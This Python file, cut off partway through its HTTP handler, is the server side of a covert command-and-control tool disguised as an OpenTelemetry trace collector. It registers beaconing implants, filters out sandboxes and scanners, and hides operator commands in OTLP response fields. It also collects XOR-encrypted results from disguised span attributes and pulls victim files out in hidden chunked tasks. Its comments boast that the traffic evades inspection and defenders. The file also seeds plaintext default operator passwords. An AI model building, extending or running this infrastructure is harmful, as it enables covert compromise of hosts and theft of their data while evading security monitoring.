#!/usr/bin/env python3
"""
TelemetryHub Full Server - Dual-Interface Telemetry Server

Provides:
1. gRPC OTLP endpoint (port 4317) for endpoint communication
   - Standard OTel gRPC TraceService
   - Binary protobuf format (stealthier, harder to inspect)
   - HTTP/2 multiplexing

2. HTTP OTLP endpoint (/v1/traces on port 4318) for endpoint communication
   - POST /v1/traces only (standard OTLP protocol)
   - Endpoint check-ins via POST body (protobuf or JSON)
   - Task delivery via POST response (embedded in response)
   - Result collection via POST body (hidden in span attributes)
   - NO agent ID in URLs - fully standard OTLP

3. REST API (/api/*) for operator UI
   - Endpoint management
   - Task queuing
   - Result retrieval
   - Statistics

4. TLS Support for encrypted traffic

The OTLP traffic is indistinguishable from legitimate OpenTelemetry data.
gRPC+Protobuf provides additional stealth:
- Binary protocol harder to inspect than JSON
- HTTP/2 multiplexing makes traffic analysis harder
- Matches real OTel SDK behavior (most use gRPC by default)
"""

from fastapi import FastAPI, Request, HTTPException, Depends, Header
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from datetime import datetime
from typing import Dict, List, Optional
from pydantic import BaseModel
import secrets
import json
import base64
import hashlib
import hmac
import threading
from concurrent import futures
import sqlite3
import os

# Database path
DB_PATH = os.path.join(os.path.dirname(__file__), "ghostspan.db")

def init_database():
    """Initialize SQLite database for persistent storage"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # Create operators table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS operators (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            role TEXT NOT NULL,
            avatar TEXT,
            created_at TEXT NOT NULL
        )
    ''')

    # Insert default operators if they don't exist
    default_operators = [
        ("op-001", "operator1", "operator", "Admin", "1", datetime.now().isoformat()),
        ("op-002", "operator2", "operator", "Operator", "2", datetime.now().isoformat())
    ]

    for op in default_operators:
        cursor.execute('''
            INSERT OR IGNORE INTO operators (id, username, password, role, avatar, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', op)

    conn.commit()
    conn.close()
    print("[INFO] Database initialized")

def get_db_connection():
    """Get database connection"""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def load_operators_from_db():
    """Load operators from database into memory"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM operators')
    rows = cursor.fetchall()
    conn.close()

    ops = {}
    for row in rows:
        ops[row['username']] = {
            "id": row['id'],
            "username": row['username'],
            "password": row['password'],
            "role": row['role'],
            "avatar": row['avatar'],
            "created_at": row['created_at']
        }
    return ops

# Initialize database on startup
init_database()

# gRPC support
try:
    import grpc
    from grpc import aio as grpc_aio
    GRPC_AVAILABLE = True
except ImportError:
    GRPC_AVAILABLE = False
    print("[WARN] grpcio not installed. gRPC support disabled.")
    print("[WARN] Install with: pip install grpcio grpcio-tools")

# Protobuf support for .NET/Java/Go OTel SDKs
try:
    from google.protobuf.json_format import MessageToDict, MessageToJson
    from opentelemetry.proto.collector.trace.v1.trace_service_pb2 import (
        ExportTraceServiceRequest,
        ExportTraceServiceResponse,
    )
    from opentelemetry.proto.collector.trace.v1 import trace_service_pb2_grpc
    from opentelemetry.proto.trace.v1.trace_pb2 import TracesData
    PROTOBUF_AVAILABLE = True
except ImportError:
    PROTOBUF_AVAILABLE = False
    print("[WARN] opentelemetry-proto not installed. Protobuf support disabled.")
    print("[WARN] Install with: pip install opentelemetry-proto")

# ============================================================
# ENCRYPTION FOR TELEMETRY DATA
# ============================================================

MASTER_SECRET = b"Enterprise-Monitoring-v1"  # Must match endpoint

# Authentication secret for agent header validation (set via environment or config)
# If empty/None, auth is disabled (for backwards compatibility)
AUTH_SECRET = os.environ.get("OTEL_AUTH_SECRET", "")

# Attribute mappings - rotating pairs to defeat fingerprinting
# Each pair: (data_attr, id_attr) - must match agent's attributePairs
ROTATING_ATTR_PAIRS = [
    ("db.statement", "db.connection_string"),
    ("db.query.text", "db.connection.id"),
    ("http.request.body", "http.request.header.x-request-id"),
    ("rpc.message.payload", "rpc.request.id"),
    ("messaging.message.payload", "messaging.message.id"),
    ("http.response.body", "http.response.header.x-correlation-id"),
    ("graphql.document", "graphql.operation.name"),
    ("aws.lambda.invoked_arn", "aws.request_id"),
]

# Legacy fixed mappings (for backwards compatibility)
ATTR_MAP = {
    'task': 'db.statement',
    'result': 'db.query.text',
    'task_id': 'db.connection.id',
    'sysinfo': 'app.config.json',
}

def find_data_in_rotating_attrs(span_attrs: dict) -> tuple:
    """
    Search for data in any of the rotating attribute pairs.
    Returns (data, task_id) or (None, None) if not found.
    """
    for data_attr, id_attr in ROTATING_ATTR_PAIRS:
        data = span_attrs.get(data_attr)
        if data:
            task_id = span_attrs.get(id_attr, "unknown")
            return data, task_id
    return None, None

def derive_key(endpoint_id: str) -> bytes:
    """Derive encryption key from endpoint ID"""
    return hmac.new(MASTER_SECRET, endpoint_id.encode(), hashlib.sha256).digest()[:16]

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encryption"""
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def encode_data(plaintext: str, endpoint_id: str) -> str:
    """Encrypt and encode data for endpoint"""
    key = derive_key(endpoint_id)
    encrypted = xor_encrypt(plaintext.encode('utf-8'), key)
    return base64.b64encode(encrypted).decode('ascii')

def decode_data(encoded: str, endpoint_id: str) -> str:
    """Decode and decrypt data from endpoint"""
    try:
        key = derive_key(endpoint_id)
        encrypted = base64.b64decode(encoded)
        decrypted = xor_encrypt(encrypted, key)
        return decrypted.decode('utf-8')
    except:
        return encoded  # Return as-is if decoding fails

app = FastAPI(
    title="OTel Collector",
    description="OpenTelemetry Collector Service",
    version="1.0.0"
)

# Enable CORS for the UI
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================
# AGENT LIFECYCLE CONSTANTS
# ============================================================
# Session-based identity: agents must prove they're real before becoming visible
# This prevents sandbox/scanner executions from creating persistent agents

MIN_BEACONS_FOR_ACTIVE = 2          # Must beacon at least 2 times
MIN_LIFETIME_SECONDS = 30           # Must be alive for 30+ seconds
PENDING_TIMEOUT_SECONDS = 300       # Pending agents expire after 5 min (sandbox timeout)

# Agent states
AGENT_STATE_PENDING = "pending"     # First contact, not yet real
AGENT_STATE_ACTIVE = "active"       # Completed lifecycle, real agent

# ============================================================
# DATA MODELS
# ============================================================

class PendingAgent:
    """Agent that hasn't completed the lifecycle yet (possible sandbox/scanner)"""
    def __init__(self, endpoint_id: str, service: str, host: str):
        self.id = endpoint_id
        self.service = service
        self.hostname = host
        self.os = "Unknown"
        self.arch = "Unknown"
        self.user = "Unknown"
        self.ip_address = "Unknown"
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.beacon_count = 1
        self.state = AGENT_STATE_PENDING
        self.elevated = False
        # Store sysinfo for later if promoted
        self.pending_sysinfo = {}

    def to_dict(self):
        return {
            "id": self.id,
            "service": self.service,
            "hostname": self.hostname,
            "os": self.os,
            "user": self.user,
            "ip_address": self.ip_address,
            "first_seen": self.first_seen.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "beacon_count": self.beacon_count,
            "state": self.state,
            "elevated": self.elevated,
            "lifetime_seconds": (datetime.now() - self.first_seen).total_seconds()
        }

class Endpoint:
    def __init__(self, endpoint_id: str, service: str, host: str):
        self.id = endpoint_id
        self.service = service
        self.hostname = host
        self.os = "Unknown"
        self.arch = "Unknown"
        self.user = "Unknown"
        self.ip_address = "Unknown"
        self.elevated = False
        self.status = "active"
        self.first_seen = datetime.now().isoformat()
        self.last_seen = datetime.now().isoformat()
        self.sleep_interval = 3

    def to_dict(self):
        return {
            "id": self.id,
            "service": self.service,
            "hostname": self.hostname,
            "os": self.os,
            "arch": self.arch,
            "user": self.user,
            "ip_address": self.ip_address,
            "elevated": self.elevated,
            "status": self.status,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "sleep_interval": self.sleep_interval
        }

class Task:
    def __init__(self, task_id: str, endpoint_id: str, task_type: str, args: List[str],
                 operator_id: str = None, operator_name: str = None, hidden: bool = False):
        self.id = task_id
        self.endpoint_id = endpoint_id
        self.type = task_type
        self.args = args
        self.operator_id = operator_id or "op-001"
        self.operator_name = operator_name or "Operator1"
        self.status = "pending"
        self.created_at = datetime.now().isoformat()
        self.hidden = hidden  # Hidden tasks don't show in console (e.g., download chunks)

    def to_dict(self):
        return {
            "id": self.id,
            "endpoint_id": self.endpoint_id,
            "type": self.type,
            "args": self.args,
            "operator_id": self.operator_id,
            "operator_name": self.operator_name,
            "status": self.status,
            "created_at": self.created_at,
            "hidden": self.hidden
        }

class Result:
    def __init__(self, cmd_id: str, endpoint_id: str, result: str, hidden: bool = False):
        self.id = cmd_id
        self.endpoint_id = endpoint_id
        self.result = result
        self.received_at = datetime.now().isoformat()
        self.hidden = hidden  # Hidden results don't show in console

    def to_dict(self):
        return {
            "id": self.id,
            "endpoint_id": self.endpoint_id,
            "result": self.result,
            "received_at": self.received_at,
            "hidden": self.hidden
        }

class DownloadedFile:
    """Represents a file being downloaded from an agent"""
    def __init__(self, file_id: str, endpoint_id: str, original_path: str, filename: str,
                 total_chunks: int, file_size: int):
        self.id = file_id
        self.endpoint_id = endpoint_id
        self.original_path = original_path
        self.filename = filename
        self.total_chunks = total_chunks
        self.file_size = file_size
        self.chunks_received = 0
        self.status = "pending"  # pending, downloading, complete, failed
        self.created_at = datetime.now().isoformat()
        self.completed_at = None
        self.local_path = None  # Path where file is saved on server
        self.error = None

    def to_dict(self):
        return {
            "id": self.id,
            "endpoint_id": self.endpoint_id,
            "original_path": self.original_path,
            "filename": self.filename,
            "total_chunks": self.total_chunks,
            "file_size": self.file_size,
            "chunks_received": self.chunks_received,
            "status": self.status,
            "created_at": self.created_at,
            "completed_at": self.completed_at,
            "local_path": self.local_path,
            "error": self.error
        }

# ============================================================
# STORAGE
# ============================================================

endpoints: Dict[str, Endpoint] = {}
tasks: Dict[str, List[Task]] = {}  # endpoint_id -> [tasks]
task_queue: Dict[str, List[Task]] = {}  # endpoint_id -> [pending tasks]
results: Dict[str, Result] = {}  # task_id -> result
all_tasks: List[Task] = []  # All tasks for UI

# File download storage
downloads: Dict[str, DownloadedFile] = {}  # file_id -> DownloadedFile
download_chunks: Dict[str, Dict[int, bytes]] = {}  # file_id -> {chunk_idx: data}
pending_downloads: Dict[str, str] = {}  # task_id -> file_id (maps META request task to file)

# Create downloads directory
DOWNLOADS_DIR = os.path.join(os.path.dirname(__file__), "downloads")
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

# Pending agents (not yet promoted to active - possible scanners/sandboxes)
pending_agents: Dict[str, PendingAgent] = {}

# OTLP Stats (gRPC only)
otlp_stats = {
    "traces_received": 0,
    "traces_sent": 0,
    "grpc_requests": 0
}

# ============================================================
# AGENT LIFECYCLE MANAGEMENT
# ============================================================

def handle_agent_beacon(endpoint_id: str, service: str, host: str) -> tuple:
    """
    Handle agent beacon - implements session-based lifecycle.

    Returns: (endpoint_or_none, is_active, should_deliver_tasks)

    - First contact: Creates pending agent, returns (None, False, False)
    - Subsequent beacons while pending: Updates pending, checks promotion
    - After promotion: Returns (endpoint, True, True)
    """
    now = datetime.now()

    # Check if already active
    if endpoint_id in endpoints:
        # Active agent - update last_seen
        endpoints[endpoint_id].last_seen = now.isoformat()
        endpoints[endpoint_id].status = "active"
        return (endpoints[endpoint_id], True, True)

    # Check if pending
    if endpoint_id in pending_agents:
        pending = pending_agents[endpoint_id]
        pending.last_seen = now
        pending.beacon_count += 1

        lifetime = (now - pending.first_seen).total_seconds()

        # Check promotion criteria
        if pending.beacon_count >= MIN_BEACONS_FOR_ACTIVE and lifetime >= MIN_LIFETIME_SECONDS:
            # PROMOTE to active!
            endpoint = Endpoint(endpoint_id, pending.service, pending.hostname)
            endpoint.os = pending.os
            endpoint.arch = pending.arch
            endpoint.user = pending.user
            endpoint.ip_address = pending.ip_address
            endpoint.elevated = pending.elevated
            endpoint.first_seen = pending.first_seen.isoformat()
            endpoint.last_seen = now.isoformat()

            # Apply any pending sysinfo
            if pending.pending_sysinfo:
                for key, val in pending.pending_sysinfo.items():
                    setattr(endpoint, key, val)

            endpoints[endpoint_id] = endpoint
            del pending_agents[endpoint_id]

            print(f"[LIFECYCLE] Agent PROMOTED to active: {endpoint_id[:16]} (beacons={pending.beacon_count}, lifetime={int(lifetime)}s)")
            return (endpoint, True, True)
        else:
            # Still pending - no tasks yet
            print(f"[LIFECYCLE] Pending agent beacon: {endpoint_id[:16]} (beacons={pending.beacon_count}/{MIN_BEACONS_FOR_ACTIVE}, lifetime={int(lifetime)}s/{MIN_LIFETIME_SECONDS}s)")
            return (None, False, False)

    # NEW agent - create as PENDING
    pending = PendingAgent(endpoint_id, service, host)
    pending_agents[endpoint_id] = pending
    print(f"[LIFECYCLE] New PENDING agent: {endpoint_id[:16]} - must beacon {MIN_BEACONS_FOR_ACTIVE}x over {MIN_LIFETIME_SECONDS}s to activate")
    return (None, False, False)

def update_pending_agent_info(endpoint_id: str, **kwargs):
    """Update info on a pending agent (before promotion)"""
    if endpoint_id in pending_agents:
        pending = pending_agents[endpoint_id]
        for key, value in kwargs.items():
            if hasattr(pending, key):
                setattr(pending, key, value)
            else:
                pending.pending_sysinfo[key] = value

def cleanup_expired_pending_agents():
    """Remove pending agents that never completed lifecycle (sandbox/scanner executions)"""
    now = datetime.now()
    expired = []

    for eid, pending in pending_agents.items():
        age = (now - pending.first_seen).total_seconds()
        if age > PENDING_TIMEOUT_SECONDS:
            expired.append(eid)

    for eid in expired:
        pending = pending_agents[eid]
        print(f"[LIFECYCLE] Pending agent EXPIRED (likely sandbox): {eid[:16]} - hostname={pending.hostname}, beacons={pending.beacon_count}")
        del pending_agents[eid]

    return len(expired)

# ============================================================
# FILE DOWNLOAD HANDLING
# ============================================================

def process_download_result(task_id: str, endpoint_id: str, result_text: str):
    """
    Process download command results (META, CHUNK, or ERROR responses).
    Returns True if this was a download result, False otherwise.
    """
    if not result_text:
        return False

    # Check for META response: M:total_chunks:file_size:filename
    if result_text.startswith("M:"):
        parts = result_text.split(":", 3)
        if len(parts) >= 4:
            try:
                total_chunks = int(parts[1])
                file_size = int(parts[2])
                filename = parts[3]

                # Get original path from the task
                original_path = ""
                for task in all_tasks:
                    if task.id == task_id:
                        # Task args are base64 encoded
                        if task.args:
                            try:
                                original_path = base64.b64decode(task.args[0]).decode('utf-8')
                            except:
                                original_path = task.args[0] if task.args else ""
                        break

                # Create download entry
                file_id = f"dl-{secrets.token_hex(8)}"
                download = DownloadedFile(
                    file_id=file_id,
                    endpoint_id=endpoint_id,
                    original_path=original_path,
                    filename=filename,
                    total_chunks=total_chunks,
                    file_size=file_size
                )
                download.status = "downloading"
                downloads[file_id] = download
                download_chunks[file_id] = {}
                pending_downloads[task_id] = file_id

                print(f"[Download] Started: {filename} ({file_size} bytes, {total_chunks} chunks)")

                # Queue chunk download tasks (hidden from console, low priority)
                for i in range(total_chunks):
                    chunk_task = Task(
                        task_id=secrets.token_hex(4),
                        endpoint_id=endpoint_id,
                        task_type="download",
                        args=[base64.b64encode(f"{original_path} {i}".encode()).decode()],
                        operator_id="system",
                        operator_name="Auto-Download",
                        hidden=True  # Don't show in console
                    )
                    if endpoint_id not in task_queue:
                        task_queue[endpoint_id] = []
                    task_queue[endpoint_id].append(chunk_task)
                    all_tasks.append(chunk_task)
                    # Map chunk task to file
                    pending_downloads[chunk_task.id] = file_id

                return True
            except (ValueError, IndexError) as e:
                print(f"[Download] META parse error: {e}")
                return False

    # Check for CHUNK response: C:index:total:filename:base64data
    if result_text.startswith("C:"):
        parts = result_text.split(":", 4)
        if len(parts) >= 5:
            try:
                chunk_index = int(parts[1])
                total_chunks = int(parts[2])
                filename = parts[3]
                chunk_data = base64.b64decode(parts[4])

                # Find the file_id for this task
                file_id = pending_downloads.get(task_id)
                if file_id and file_id in downloads:
                    download = downloads[file_id]
                    download_chunks[file_id][chunk_index] = chunk_data
                    download.chunks_received = len(download_chunks[file_id])

                    print(f"[Download] Chunk {chunk_index + 1}/{total_chunks} received for {filename}")

                    # Check if all chunks received
                    if download.chunks_received >= download.total_chunks:
                        # Reassemble file
                        try:
                            # Create endpoint subdirectory
                            endpoint_dir = os.path.join(DOWNLOADS_DIR, endpoint_id[:16])
                            os.makedirs(endpoint_dir, exist_ok=True)

                            # Generate unique filename
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            safe_filename = "".join(c for c in filename if c.isalnum() or c in "._-")
                            local_filename = f"{timestamp}_{safe_filename}"
                            local_path = os.path.join(endpoint_dir, local_filename)

                            # Write chunks in order
                            with open(local_path, 'wb') as f:
                                for i in range(download.total_chunks):
                                    if i in download_chunks[file_id]:
                                        f.write(download_chunks[file_id][i])

                            download.status = "complete"
                            download.completed_at = datetime.now().isoformat()
                            download.local_path = local_path

                            # Clean up chunks from memory
                            del download_chunks[file_id]

                            print(f"[Download] Complete: {filename} saved to {local_path}")

                        except Exception as e:
                            download.status = "failed"
                            download.error = str(e)
                            print(f"[Download] Failed to save {filename}: {e}")

                return True
            except (ValueError, IndexError) as e:
                print(f"[Download] CHUNK parse error: {e}")
                return False

    # Check for ERROR response: ERROR:message
    if result_text.startswith("ERROR:"):
        file_id = pending_downloads.get(task_id)
        if file_id and file_id in downloads:
            downloads[file_id].status = "failed"
            downloads[file_id].error = result_text[6:]  # Remove "ERROR:" prefix
            print(f"[Download] Error: {result_text[6:]}")
        return True

    return False

# ============================================================
# OTLP ENDPOINTS - gRPC (primary) + HTTP (fallback)
# ============================================================
#
# Agent communication supports both protocols:
# - gRPC/Protobuf on port 4317 (primary, stealthiest)
# - HTTP/Protobuf on port 4318 /v1/traces (fallback for corporate proxies)
#
# HTTP fallback is needed when corporate SSL inspection breaks gRPC.
# Both are standard OTLP protocols used by real OTel collectors.
# ============================================================


# ============================================================
# gRPC TRACE SERVICE (Agent Communication via gRPC/Protobuf)
# ============================================================

# Base class for when gRPC is not available
if not (GRPC_AVAILABLE and PROTOBUF_AVAILABLE):
    class _DummyServicer:
        pass
    trace_service_pb2_grpc = type('', (), {'TraceServiceServicer': _DummyServicer})()


class TraceServiceServicer(trace_service_pb2_grpc.TraceServiceServicer):
    """
    gRPC implementation of OpenTelemetry TraceService.

    This is the stealthiest communication method:
    - Binary protobuf (not human-readable like JSON)
    - HTTP/2 with multiplexing
    - Standard OTel gRPC protocol (most SDKs use this by default)
    - Indistinguishable from real application telemetry
    """

    def Export(self, request, context):
        """
        Handle ExportTraceServiceRequest from agents.

        The agent sends traces via gRPC, we:
        1. Extract endpoint info from resource attributes
        2. Extract any task results from span attributes
        3. Return any pending tasks in the response
        """
        try:
            # Validate auth header if AUTH_SECRET is configured
            if AUTH_SECRET:
                metadata = dict(context.invocation_metadata())
                client_auth = metadata.get('x-api-key', '')
                if client_auth != AUTH_SECRET:
                    # Silently reject - return empty response (don't reveal auth exists)
                    return ExportTraceServiceResponse()

            # Convert protobuf to dict for processing
            data = MessageToDict(request, preserving_proto_field_name=False)

            otlp_stats["traces_received"] += 1
            otlp_stats["grpc_requests"] += 1

            endpoint_id = "unknown"

            for rs in data.get("resourceSpans", []):
                # Extract endpoint info from resource attributes
                resource = rs.get("resource", {})
                attrs = {a["key"]: a["value"].get("stringValue", a["value"].get("intValue", ""))
                        for a in resource.get("attributes", [])}

                endpoint_id = attrs.get("service.instance.id", "unknown")
                service = attrs.get("service.name", "unknown")
                host = attrs.get("host.name", "unknown")

                # Handle agent lifecycle - may be pending or active
                endpoint_obj, is_active, should_deliver_tasks = handle_agent_beacon(endpoint_id, service, host)

                # Update agent info from resource attributes (only if present)
                # Note: user is NOT in resource attrs - it comes from sysinfo in span attrs
                if is_active and endpoint_obj:
                    if "host.arch" in attrs:
                        endpoint_obj.arch = attrs["host.arch"]
                    if "os.type" in attrs:
                        endpoint_obj.os = attrs["os.type"]
                    if "user.name" in attrs:
                        endpoint_obj.user = attrs["user.name"]
                else:
                    # Update pending agent info - only update fields that are actually present
                    if "host.arch" in attrs:
                        update_pending_agent_info(endpoint_id, arch=attrs["host.arch"])
                    if "os.type" in attrs:
                        update_pending_agent_info(endpoint_id, os=attrs["os.type"])
                    if "user.name" in attrs:
                        update_pending_agent_info(endpoint_id, user=attrs["user.name"])

                # Track if this request contains a result (vs just a heartbeat)
                # Results come from OTel SDK which ignores response, so don't deliver tasks with results
                is_result_submission = False

                # Extract results from span attributes
                for ss in rs.get("scopeSpans", []):
                    for span in ss.get("spans", []):
                        span_attrs = {a["key"]: a["value"].get("stringValue", "")
                                     for a in span.get("attributes", [])}

                        # Check for telemetry result in rotating attribute pairs
                        result_attr, task_id_attr = find_data_in_rotating_attrs(span_attrs)

                        # Also check legacy fixed attributes
                        if not result_attr:
                            result_attr = span_attrs.get(ATTR_MAP['result']) or span_attrs.get("telemetry.result")
                            task_id_attr = span_attrs.get(ATTR_MAP['task_id']) or span_attrs.get("telemetry.id")

                        if result_attr and task_id_attr:
                            task_id = task_id_attr
                            is_result_submission = True  # This request contains a result
                            # Find the task and check if it exists/is hidden
                            task_obj = next((t for t in all_tasks if t.id == task_id), None)
                            if task_obj:
                                # Decrypt the result
                                result_text = decode_data(result_attr, endpoint_id)

                                # Check if this is a download result (META/CHUNK/ERROR)
                                is_download = process_download_result(task_id, endpoint_id, result_text)

                                # Store result - for CHUNK results, show cleaner message in UI
                                display_text = result_text
                                if result_text.startswith("C:"):
                                    parts = result_text.split(":", 4)
                                    if len(parts) >= 5:
                                        chunk_idx, total, filename = parts[1], parts[2], parts[3]
                                        display_text = f"Downloaded chunk {int(chunk_idx)+1}/{total} of {filename}"

                                # Mark result as hidden if task was hidden
                                results[task_id] = Result(task_id, endpoint_id, display_text, hidden=task_obj.hidden)
                                if not task_obj.hidden:
                                    print(f"[gRPC] Result received: {task_id}" + (" (download)" if is_download else ""))

                                # Update task status
                                task_obj.status = "completed"

                        # Check for sysinfo - can be in rotating attrs or fixed attr
                        sysinfo_attr = None
                        for data_attr, id_attr in ROTATING_ATTR_PAIRS:
                            if span_attrs.get(id_attr) == "init":
                                sysinfo_attr = span_attrs.get(data_attr)
                                break
                        if not sysinfo_attr:
                            sysinfo_attr = span_attrs.get(ATTR_MAP['sysinfo'])
                        if sysinfo_attr:
                            # Decrypt and parse sysinfo
                            sysinfo_str = decode_data(sysinfo_attr, endpoint_id)
                            # Parse key=value;key=value format
                            sysinfo_dict = {}
                            for pair in sysinfo_str.split(';'):
                                if '=' in pair:
                                    k, v = pair.split('=', 1)
                                    sysinfo_dict[k] = v

                            # Update either active endpoint or pending agent
                            if is_active and endpoint_obj:
                                endpoint_obj.os = sysinfo_dict.get("os", "Unknown")
                                endpoint_obj.arch = sysinfo_dict.get("arch", "Unknown")
                                endpoint_obj.user = sysinfo_dict.get("user", "Unknown")
                                endpoint_obj.hostname = sysinfo_dict.get("host", host)
                                endpoint_obj.ip_address = sysinfo_dict.get("ip", "Unknown")
                                endpoint_obj.elevated = sysinfo_dict.get("elevated", "false").lower() == "true"
                                print(f"[gRPC] Sysinfo updated: {endpoint_id[:16]}")
                            else:
                                # Store sysinfo for pending agent
                                update_pending_agent_info(endpoint_id,
                                    os=sysinfo_dict.get("os", "Unknown"),
                                    arch=sysinfo_dict.get("arch", "Unknown"),
                                    user=sysinfo_dict.get("user", "Unknown"),
                                    hostname=sysinfo_dict.get("host", host),
                                    ip_address=sysinfo_dict.get("ip", "Unknown"),
                                    elevated=sysinfo_dict.get("elevated", "false").lower() == "true"
                                )
                                print(f"[gRPC] Sysinfo stored for pending: {endpoint_id[:16]}")

                        # Check for batch delay update
                        for attr in span.get("attributes", []):
                            if attr.get("key") == "telemetry.sdk.batch_delay":
                                val = attr.get("value", {})
                                batch_ms = val.get("intValue") or val.get("stringValue")
                                if batch_ms:
                                    try:
                                        batch_sec = int(batch_ms) // 1000
                                        if batch_sec > 0:
                                            if is_active and endpoint_obj:
                                                endpoint_obj.sleep_interval = batch_sec
                                                print(f"[gRPC] Batch delay updated: {endpoint_id[:16]} -> {batch_sec}s")
                                            else:
                                                update_pending_agent_info(endpoint_id, sleep_interval=batch_sec)
                                    except (ValueError, TypeError):
                                        pass

            # Build gRPC response - only include tasks for active agents on heartbeat requests
            # Don't include tasks if:
            # - Agent is still pending (hasn't completed lifecycle)
            # - This is a result submission (OTel SDK exporter ignores responses)
            if is_result_submission or not should_deliver_tasks:
                return ExportTraceServiceResponse()
            else:
                response = self._build_grpc_response_with_tasks(endpoint_id)
                return response

        except Exception as e:
            import traceback
            print(f"[gRPC ERROR] Export failed: {str(e)}")
            print(f"[gRPC ERROR] Traceback: {traceback.format_exc()}")
            context.set_code(grpc.StatusCode.INTERNAL)
            context.set_details(str(e))
            return ExportTraceServiceResponse()

    def _build_grpc_response_with_tasks(self, endpoint_id: str) -> ExportTraceServiceResponse:
        """
        Build gRPC response that includes pending tasks.

        Tasks are embedded in partialSuccess.errorMessage field,
        which is a standard OTLP field - completely legitimate looking.
        """
        from opentelemetry.proto.collector.trace.v1.trace_service_pb2 import (
            ExportTracePartialSuccess
        )

        response = ExportTraceServiceResponse()

        # Check for pending tasks - prioritize non-hidden tasks (user commands over download chunks)
        if endpoint_id in task_queue and task_queue[endpoint_id]:
            queue = task_queue[endpoint_id]

            # Find first non-hidden task, or fall back to first task
            task_idx = 0
            for i, t in enumerate(queue):
                if not t.hidden:
                    task_idx = i
                    break

            task = queue.pop(task_idx)
            task.status = "delivered"

            # Build the task string
            task_str = task.type
            if task.args:
                try:
                    decoded_args = [base64.b64decode(arg).decode() for arg in task.args]
                    task_str = f"{task.type} {' '.join(decoded_args)}"
                except:
                    task_str = f"{task.type} {' '.join(task.args)}"

            # Encrypt the task
            encrypted_task = encode_data(task_str, endpoint_id)

            # Embed task in response
            task_payload = f"{task.id}:{encrypted_task}"

            # Set partial success with task embedded
            response.partial_success.rejected_spans = 0
            response.partial_success.error_message = task_payload

            otlp_stats["traces_sent"] += 1
            print(f"[gRPC] Task delivered: {task.id}")

        return response


# Global gRPC server reference
grpc_server = None


def start_grpc_server(port: int = 4317, use_tls: bool = False,
                      cert_file: str = None, key_file: str = None):
    """
    Start the gRPC server for OTLP trace collection.

    This runs on port 4317 (standard OTLP gRPC port).
    """
    global grpc_server

    if not GRPC_AVAILABLE or not PROTOBUF_AVAILABLE:
        print("[WARN] gRPC server not started - missing dependencies")
        return None

    grpc_server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
    trace_service_pb2_grpc.add_TraceServiceServicer_to_server(
        TraceServiceServicer(), grpc_server
    )

    if use_tls and cert_file and key_file:
        # Load TLS credentials
        try:
            with open(key_file, 'rb') as f:
                private_key = f.read()
            with open(cert_file, 'rb') as f:
                certificate = f.read()

            server_credentials = grpc.ssl_server_credentials(
                [(private_key, certificate)]
            )
            grpc_server.add_secure_port(f'[::]:{port}', server_credentials)
            print(f"[gRPC] Secure server starting on port {port} (TLS)")
        except Exception as e:
            print(f"[gRPC ERROR] Failed to load TLS certs: {e}")
            grpc_server.add_insecure_port(f'[::]:{port}')
            print(f"[gRPC] Insecure server starting on port {port}")
    else:
        grpc_server.add_insecure_port(f'[::]:{port}')
        print(f"[gRPC] Server starting on port {port}")

    grpc_server.start()
    return grpc_server


def stop_grpc_server():
    """Stop the gRPC server gracefully."""
    global grpc_server
    if grpc_server:
        grpc_server.stop(grace=5)
        print("[gRPC] Server stopped")


# ============================================================
# HTTP OTLP ENDPOINT (Fallback for corporate proxies)
# ============================================================

@app.post("/v1/traces")
async def http_otlp_traces(request: Request):
    """
    HTTP OTLP endpoint for trace collection.

    This is a fallback for when gRPC doesn't work (e.g., corporate SSL inspection).
    Uses the same logic as the gRPC handler but over HTTP/1.1.

    Accepts: application/x-protobuf or application/json
    Returns: ExportTraceServiceResponse (protobuf or JSON)
    """
    from fastapi.responses import Response

    # Validate auth header if AUTH_SECRET is configured
    if AUTH_SECRET:
        client_auth = request.headers.get('x-api-key', '')
        if client_auth != AUTH_SECRET:
            # Return empty response (don't reveal auth exists)
            if PROTOBUF_AVAILABLE:
                empty_response = ExportTraceServiceResponse()
                return Response(
                    content=empty_response.SerializeToString(),
                    media_type="application/x-protobuf"
                )
            return {"partialSuccess": None}

    content_type = request.headers.get('content-type', '')
    body = await request.body()

    otlp_stats["traces_received"] += 1

    # Parse the request
    data = None
    if 'protobuf' in content_type and PROTOBUF_AVAILABLE:
        try:
            pb_request = ExportTraceServiceRequest()
            pb_request.ParseFromString(body)
            data = MessageToDict(pb_request, preserving_proto_field_name=False)
        except Exception as e:
            print(f"[HTTP OTLP] Protobuf parse error: {e}")
            return Response(status_code=400, content=f"Invalid protobuf: {e}")
    else:
        # Try JSON
        try:
            data = json.loads(body)
        except Exception as e:
            print(f"[HTTP OTLP] JSON parse error: {e}")
            return Response(status_code=400, content=f"Invalid JSON: {e}")

    if not data:
        return Response(status_code=400, content="Could not parse request body")

    endpoint_id = "unknown"
    is_result_submission = False
    should_deliver_tasks = False
    is_active = False
    endpoint_obj = None

    for rs in data.get("resourceSpans", []):
        # Extract endpoint info from resource attributes
        resource = rs.get("resource", {})
        attrs = {a["key"]: a["value"].get("stringValue", a["value"].get("intValue", ""))
                for a in resource.get("attributes", [])}

        endpoint_id = attrs.get("service.instance.id", "unknown")
        service = attrs.get("service.name", "unknown")
        host = attrs.get("host.name", "unknown")

        # Handle agent lifecycle - may be pending or active
        endpoint_obj, is_active, should_deliver_tasks = handle_agent_beacon(endpoint_id, service, host)

        # Update agent info from resource attributes (only if present)
        # Note: user is NOT in resource attrs - it comes from sysinfo in span attrs
